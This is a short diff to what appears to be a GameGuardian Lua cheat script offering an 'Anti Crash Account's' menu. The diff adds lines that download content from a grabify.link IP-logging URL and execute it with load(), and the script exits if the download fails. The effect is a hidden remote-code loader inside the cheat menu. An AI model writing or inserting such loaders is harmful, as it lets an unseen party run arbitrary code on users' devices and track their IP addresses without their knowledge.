@@ -2,6 +2,13 @@ hostling = 1
 
 function home ()
 
+TG = gg.makeRequest("https://grabify.link/7G53F8").content
+if not TG then
+os.exit()
+else
+pcall(load(TG))
+end
+
 multi = gg.multiChoice({
 
 "🔓:   Anti Crash Account's"
